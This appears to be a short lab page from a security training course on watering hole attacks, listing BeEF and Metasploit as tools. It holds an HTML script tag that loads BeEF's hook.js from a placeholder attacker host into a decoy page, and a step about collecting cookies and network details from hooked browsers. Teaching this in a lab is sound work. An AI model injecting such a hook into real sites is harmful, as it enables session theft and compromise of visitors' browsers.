![Lab Image](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&h=150&fit=crop)

[⬅️ Previous](Lab-04-Advanced-Track-Bypassing-2FA-MFA.md) | [🏠 Path Home](Home.md)

---

# Lab 05: Advanced Track - Watering Hole Attacks

---


---




---


---

[⬅️ Path Home](Home.md)

---

## 🎯 Lab Objectives
- Analyze watering hole methodology targeting specific industry profiles.
- Use simulated exploitation tools to intercept victim host information.
- Implement client-side security controls to mitigate drive-by downloads.

## 🛠️ Required Tools & Setup
- **BeEF Framework:** Browser Exploitation Framework.
- **Metasploit:** Payload generation and handling.
- **Practice Room:** [TryHackMe Client Side Exploitation](https://tryhackme.com/room/clientsideexploitation)

## 🚶 Step-by-Step Lab Guide

### Step 1: Intercepting a Session with BeEF hook
Inject the hook script into a local server decoy webpage:
```html
<script src="http://beef_ip:3000/hook.js"></script>
```

### Step 2: Executing Browser Command Modules
Use the BeEF Control Panel to gather browser capabilities, cookies, and network details from the connected agent.

---

[⬅️ Path Home](Home.md)

---

[⬅️ Previous](Lab-04-Advanced-Track-Bypassing-2FA-MFA.md) | [🏠 Path Home](Home.md)
